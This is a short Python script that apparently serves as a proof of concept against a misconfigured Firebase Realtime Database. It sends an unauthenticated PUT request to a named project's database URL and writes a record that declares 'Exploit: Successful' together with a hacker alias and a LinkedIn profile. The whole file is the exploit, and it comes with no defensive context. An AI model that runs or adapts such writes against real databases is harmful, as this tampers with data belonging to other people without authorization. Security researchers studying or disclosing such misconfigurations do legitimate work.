import requests

data = '{ "Exploit": "Successful", "HACKER_NAME": "B1scuit", "Profile": "linkedin.com/in/raunak-gupta-772408255/" }'
response = requests.put('https://varsityapp-59bd1.firebaseio.com/test.json', data=data)

print(response.status_code)
print(response.text)
